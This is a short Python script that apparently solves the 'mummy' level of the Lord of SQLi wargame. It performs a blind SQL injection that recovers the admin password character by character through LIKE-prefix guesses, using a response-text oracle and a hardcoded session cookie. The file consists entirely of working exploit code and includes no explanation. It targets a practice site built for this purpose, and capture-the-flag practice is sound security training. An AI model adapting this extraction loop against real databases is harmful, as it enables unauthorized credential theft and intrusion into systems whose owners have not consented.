# lordofsqli: mummy
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php'
cookies = {'PHPSESSID': 'vboarv46gs86k84bu0sj74svqe'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'query': f"*from[prob_mummy]where[id]='admin'and[pw]like'{passwd + c}%'"}
        r = requests.get(url, payload, cookies=cookies)
    
        if 'Hello anonymous' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)
